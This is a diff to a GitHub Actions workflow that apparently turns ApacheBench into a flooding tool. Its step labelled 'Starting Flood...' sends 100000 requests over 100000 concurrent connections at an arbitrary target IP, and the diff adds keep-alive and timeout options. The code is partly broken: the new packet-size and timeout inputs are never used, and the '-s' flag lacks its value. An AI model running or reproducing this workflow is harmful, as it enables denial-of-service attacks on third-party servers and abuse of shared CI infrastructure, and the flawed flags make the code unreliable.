@@ -11,10 +11,18 @@ on:
         description: "Number of Request(s): "
         required: true
         default: "100000"
-      multiconm:
+      multiconn:
         description: "Multi Connection: "
         required: true
         default: "100000"
+      psize:
+        description: "Packet Size: "
+        required: true
+        default: "9048"
+      maxtimeout:
+        description: "Max Socket Timeout (In Second): "
+        required: true
+        default: "1"
 
 jobs:
   build:
@@ -26,4 +34,4 @@ jobs:
         sudo apt install apache2-utils
     - name: Starting Flood...
       run: |
-        sudo ab -n ${{ github.event.inputs.numreq }} -c ${{ github.event.inputs.multiconn }} ${{ github.event.inputs.iptgt }}
+        sudo ab -k -b 9048 -s -r -n ${{ github.event.inputs.numreq }} -c ${{ github.event.inputs.multiconn }} ${{ github.event.inputs.iptgt }}
